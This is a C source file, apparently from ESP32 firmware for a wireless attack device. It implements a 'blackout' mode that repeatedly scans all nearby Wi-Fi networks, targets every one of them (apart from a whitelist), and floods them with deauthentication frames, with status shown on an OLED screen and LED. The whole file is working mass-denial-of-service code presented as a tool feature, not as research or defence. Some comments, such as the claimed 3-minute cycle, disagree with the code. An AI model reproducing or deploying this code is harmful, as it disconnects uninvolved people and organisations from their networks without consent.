#include "blackout.h"
#include "blackout_shared.h"

#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "oled_display.h"

// Blackout attack task
static TaskHandle_t blackout_attack_task_handle = NULL;
static volatile bool blackout_attack_active = false;

// Blackout attack task function (runs in background)
static void blackout_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Blackout attack task started.");
    
    // Set LED to orange for blackout attack
    esp_err_t led_err = led_set_color(255, 165, 0); // Orange
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for blackout attack start: %s", esp_err_to_name(led_err));
    }
    
    // Main loop: continuously scan and attack for 3 minutes each cycle
    while (blackout_attack_active && !operation_stop_requested) {
        MY_LOG_INFO(TAG, "Starting blackout cycle: scanning all networks...");
        oled_display_update_full("> Blackout Mode", "  Scanning...", "  Finding nets", "  Please wait");
        
        // Start background scan with fast timings
        esp_err_t scan_result = start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
        if (scan_result != ESP_OK) {
            MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait 1 second before retry
            continue;
        }
        
        // Wait for scan to complete (dynamic timeout based on channel times)
        int timeout = 0;
        int timeout_limit = get_scan_timeout_iterations();
        while (g_scan_in_progress && timeout < timeout_limit && blackout_attack_active && !operation_stop_requested) {
            vTaskDelay(pdMS_TO_TICKS(100));
            timeout++;
        }
        
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "Blackout attack: Stop requested during scan, terminating...");
            break;
        }
        
        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "Scan taking longer than expected, waiting for completion...");
            // Wait additional time for scan to complete naturally (30s max)
            int extra_wait = 0;
            while (g_scan_in_progress && extra_wait < 300 && blackout_attack_active && !operation_stop_requested) {
                vTaskDelay(pdMS_TO_TICKS(100));
                extra_wait++;
            }
            // If still in progress after extra wait, then stop
            if (g_scan_in_progress) {
                MY_LOG_INFO(TAG, "Scan still in progress, forcing stop...");
                esp_wifi_scan_stop();
                g_scan_in_progress = false;
                vTaskDelay(pdMS_TO_TICKS(500));
                continue;
            }
        }
        
        if (!g_scan_done || g_scan_count == 0) {
            MY_LOG_INFO(TAG, "No scan results available, retrying...");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        MY_LOG_INFO(TAG, "Found %d networks, sorting by channel...", g_scan_count);
        
        // Sort networks by channel (ascending order)
        for (int i = 0; i < g_scan_count - 1; i++) {
            for (int j = 0; j < g_scan_count - i - 1; j++) {
                if (g_scan_results[j].primary > g_scan_results[j + 1].primary) {
                    wifi_ap_record_t temp = g_scan_results[j];
                    g_scan_results[j] = g_scan_results[j + 1];
                    g_scan_results[j + 1] = temp;
                }
            }
        }
        
        // Set all networks as selected for attack
        g_selected_count = g_scan_count;
        for (int i = 0; i < g_selected_count; i++) {
            g_selected_indices[i] = i;
        }
        
        // Save target BSSIDs for deauth attack
        save_target_bssids();
        
        MY_LOG_INFO(TAG, "Starting deauth attack on  %d networks (except whitelist) for 100 cycles...", g_selected_count);
        
        {
            char bo_l2[64];
            snprintf(bo_l2, sizeof(bo_l2), "  Found %d nets", g_selected_count);
            oled_display_update_full("> Blackout Mode", bo_l2, "  Mass deauth", "  Starting...");
        }
        
        // Attack all networks for exactly 3 minutes (1800 cycles at 100ms each)
        int attack_cycles = 0;
        const int MAX_ATTACK_CYCLES = 100;
        
        while (attack_cycles < MAX_ATTACK_CYCLES && blackout_attack_active && !operation_stop_requested) {
            // Flash LED during attack (orange)
            esp_err_t led_err = led_set_color(255, 165, 0); // Orange
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to set LED during blackout attack: %s", esp_err_to_name(led_err));
            }
            
            // Send deauth frames to all networks
            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
            
            // Clear LED briefly
            led_err = led_clear();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to clear LED during blackout attack: %s", esp_err_to_name(led_err));
            }
            
            if (attack_cycles % 5 == 0 && target_bssid_count > 0) {
                int idx = attack_cycles % target_bssid_count;
                char bo_l2[64], bo_l3[64], bo_l4[64];
                snprintf(bo_l2, sizeof(bo_l2), ">> %s", target_bssids[idx].ssid);
                snprintf(bo_l3, sizeof(bo_l3), "  %d nets Cyc%d", g_selected_count, attack_cycles);
                snprintf(bo_l4, sizeof(bo_l4), "  Ch %d Active", target_bssids[idx].channel);
                oled_display_update_full("> Blackout Mode", bo_l2, bo_l3, bo_l4);
            }
            
            attack_cycles++;
            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between attack cycles
        }
        
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "Blackout attack: Stop requested during attack, terminating...");
            break;
        }
        
        MY_LOG_INFO(TAG, "3-minute attack cycle completed, starting new scan...");
        oled_display_update_full("> Blackout Mode", "  Cycle done", "  New scan...", "");
        
        // Immediately start next scan cycle (no waiting)
    }
    
    // Clean up LED after attack finishes
    led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after blackout attack: %s", esp_err_to_name(led_err));
    }
    
    // Clean up
    blackout_attack_active = false;
    blackout_attack_task_handle = NULL;
    
    // Clear target BSSIDs
    target_bssid_count = 0;
    memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
    
    MY_LOG_INFO(TAG, "Blackout attack task finished.");
    
    vTaskDelete(NULL); // Delete this task
}

// Blackout attack command - scans all networks every 3 minutes, sorts by channel, attacks all
int cmd_start_blackout(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    oled_display_update_full("> Blackout Mode", "  All networks", "  Mass deauth", "  Active...");
    log_memory_info("start_blackout");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if blackout attack is already running
    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Blackout attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting blackout attack - scanning all networks every 3 minutes...");
    MY_LOG_INFO(TAG, "Networks will be sorted by channel for efficient attacking.");
    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack.");
    
    // Start blackout attack in background task
    blackout_attack_active = true;
    BaseType_t result = xTaskCreate(
        blackout_attack_task,
        "blackout_task",
        4096,  // Stack size
        NULL,
        5,     // Priority
        &blackout_attack_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create blackout attack task!");
        blackout_attack_active = false;
        return 1;
    }
    
    return 0;
}

void blackout_stop(void) {
    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping blackout attack task...");
        blackout_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && blackout_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (blackout_attack_task_handle != NULL) {
            vTaskDelete(blackout_attack_task_handle);
            blackout_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Blackout attack task forcefully stopped.");
        }
        
        // Clear target BSSIDs
        target_bssid_count = 0;
        memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
    }
}

bool blackout_attack_is_active(void) {
    return blackout_attack_active;
}

bool blackout_attack_is_running(void) {
    return blackout_attack_active || blackout_attack_task_handle != NULL;
}
